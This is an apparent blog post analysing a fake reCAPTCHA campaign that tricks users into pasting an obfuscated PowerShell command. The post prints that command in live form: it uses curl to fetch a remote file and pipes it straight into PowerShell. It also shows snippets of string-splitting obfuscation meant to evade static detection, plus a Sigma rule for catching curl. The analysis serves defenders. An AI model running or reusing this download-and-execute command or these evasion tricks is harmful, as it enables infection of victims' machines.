---
title: "Breaking Down A Multi-Stage PowerShell Infection👾"
last_modified_at: 2025-05-11T12:38:14
---
<img src="https://cdn.jsdelivr.net/gh/AviaB1/AviaB1.github.io@master/assets/images/styling-syntax-test/PowerShellChain/0.jpg" alt="PowerShell Infection">

# Overview
Fake reCAPTCHA campaigns are nothing new in the cyber threat landscape. Despite their simplicity, these campaigns are surprisingly effective at tricking users.  
The technique is straightforward: the victim is shown a fake reCAPTCHA page that instructs them to verify their identity by pasting a PowerShell command into the Windows Run dialog. This seemingly harmless action initiates the infection chain.

This article will focus on deobfuscating and analyzing the infection chain step by step, all the way to the final payload. It will also break down and explain the various techniques used by the attacker.

Here's a high-level diagram of the infection chain:
<img src="https://cdn.jsdelivr.net/gh/AviaB1/AviaB1.github.io@master/assets/images/styling-syntax-test/PowerShellChain/1.jpg" alt="PowerShell Infection">

## 1st Stage Analysis

We can see the infamous fake reCAPTCHA page. Upon clicking "I'm not a robot," a prompt pops up, providing us with clear instructions regarding the "verification" process.

<img src="https://cdn.jsdelivr.net/gh/AviaB1/AviaB1.github.io@master/assets/images/styling-syntax-test/PowerShellChain/2.png" alt="PowerShell Infection">

If we follow the instructions, we notice that something is copied to our clipboard. At first glance, this doesn't appear alarming.

<img src="https://cdn.jsdelivr.net/gh/AviaB1/AviaB1.github.io@master/assets/images/styling-syntax-test/PowerShellChain/3.png" alt="PowerShell Infection">

However, when we paste the command into a text editor, we quickly realize it reveals something much different from what we initially expected.
```powershell
PoWERSHElL -w M"in"i"m"ized c"Url.E"X"e" -k -L --"re"try 9"9"9  ht"tps:/"/"dy"b"e"p.fu"n"/"fb8"8"c"1eb2"1"d"4"f"e2"71"2"723729a"d2"f"e"7"38.tx"t | powe"r"shell -;" ð Access Guard: Validation. RefID: 45ab26cf05b6abc95f
```
Before we delve into the specifics of what this command does and the techniques it employs, it’s crucial to first understand how this command made its way into our clipboard.

Looking at the HTML source code, we can see the initialization of a new `<script>` tag, followed by obfuscated JavaScript code.

<img src="https://cdn.jsdelivr.net/gh/AviaB1/AviaB1.github.io@master/assets/images/styling-syntax-test/PowerShellChain/4.jpg" alt="PowerShell Infection">

The obfuscator used here is Obfuscator.io, a free, open-source tool designed to obfuscate JavaScript code. This tool is commonly used by threat actors and malware authors.

Using a deobfuscator for Obfuscator.io reveals much cleaner and more readable code.

<img src="https://cdn.jsdelivr.net/gh/AviaB1/AviaB1.github.io@master/assets/images/styling-syntax-test/PowerShellChain/5.png" alt="PowerShell Infection">

This code is still somewhat obfuscated, so let's manually deobfuscate it to fully understand what's going on.

<img src="https://cdn.jsdelivr.net/gh/AviaB1/AviaB1.github.io@master/assets/images/styling-syntax-test/PowerShellChain/6.png" alt="PowerShell Infection">

After renaming some variables to more meaningful names, we can clearly see that this script creates an element named `textarea`, sets its content to a Base64-encoded string, and then decodes it using `window.atob()`. After that, it uses `document.execCommand("copy")` to copy the decoded content to the victim's clipboard.


Now that we have a better understanding of the code and its functionality, let’s pivot to the actual PowerShell command:
```PowerShell
PoWERSHElL -w M"in"i"m"ized c"Url.E"X"e" -k -L --"re"try 9"9"9  ht"tps:/"/"dy"b"e"p.fu"n"/"fb8"8"c"1eb2"1"d"4"f"e2"71"2"723729a"d2"f"e"7"38.tx"t | powe"r"shell -;" ð Access Guard: Validation. RefID: 45ab26cf05b6abc95f
```
We can see a number of techniques implemented here:
- case‐altered obfuscation
- string splitting obfuscation

Both techniques are primarily used to evade static detection and are quite easy to implement. Let’s go over each and explain different ways they can be applied.

## Case‐altered obfuscation
Attackers exploit PowerShell’s inherent case-insensitivity, where cmdlets, parameters, and operators ignore letter case, by randomly or deliberately mixing uppercase and lowercase characters within commands and parameters. For example, instead of writing `powershell`, an attacker might write `PoWeRShELL` to evade static detection by security tools.

In our example the attacker used this technique several times -
```CSS
PoWERSHElL ---> PowerShell
cUrl.EXe --> curl.exe
```

## String splitting obfuscation
Another common technique is splitting a string into multiple parts and reconstructing it at runtime. This tactic is often used to evade static detection by breaking up known malicious patterns.

For example, we can create a Sigma rule that looks for `curl.exe` execution. Using string-splitting-based obfuscation evades this rule because the literal `curl.exe` never appears in the command line, it’s constructed at runtime from multiple parts. However, by leveraging PowerShell **Script Block Logging** (Event ID 4104), which records the fully deobfuscated script as it’s executed, this obfuscation becomes ineffective because the log contains the assembled command in clear text
```CSS
title: Curl Execution
id: 123-456-678-890
logsource:
  product: windows
  service: security
detection:
  selection:
    CommandLine|contains: 'curl.exe'
  condition: selection
```

There are multiple ways to implement string splitting obfuscation.

**Using Plus-Operator Concatenation**  
PowerShell’s addition operator (`+`) can concatenate string literals at runtime, e.g.:
```PowerShell
$url = 'h' + 'ttps://' + 'aviab.com' + '/payload.ps1'
```

**Using the `-Join` Operator**  
By placing fragments in an array and joining them, you prevent static detections of the assembled string:
```PowerShell
$parts = 'ht','tp','s:','//av','iab','.com'
$url = $parts -Join ''
```
The `-Join ''` collapses the array into the full URL only at execution time

**Using the Format Operator (`-f`)**  
The format operator reorders and injects substrings according to placeholders:
```PowerShell
& ("{1}{0}" -f 'ab','avi')
```

**Using Array Slicing and Reversal**  
You can slice and reverse a character array to stealthily reconstruct strings:
```PowerShell
-join ([char[]]'1baiva'[-1..-6])
```

Now that we've discussed some of the techniques used by the attacker, let's analyze the entire command:
```PowerShell
PowerShell -w Minimized curl.exe -k -L --retry 999  hxxps[://]dybep[.]fun/fb88c1eb21d4fe2712723729ad2fe738[.]txt | powershell -; 🌐 Access Guard: Validation. RefID: 45ab26cf05b6abc95f
```
We can see that the attacker runs PowerShell with the **`-WindowStyle Minimized`** (`-w Minimized`) flag to launch a minimized window, reducing the chance of the user noticing. Then, `curl.exe` is used with the `-k` (ignore certificate errors), `-L` (follow redirects), and `--retry 999` (try up to 999 times) options to fetch a remote payload from `dybep[.]fun`.

The downloaded content is piped (`|`) directly into another PowerShell instance using `powershell -`, which tells PowerShell to read and execute commands from standard input (i.e. the result of the `curl` request).

The part after the semicolon (`;`) - `🌐 Access Guard: Validation. RefID: 45ab26cf05b6abc95f` is not executed. It's simply a **comment**, used as social engineering to make the command look like a benign system message. This is particularly misleading in the **Run dialog** (`Win+R`), which only displays the part of the command after the semicolon, making the malicious portion less obvious.


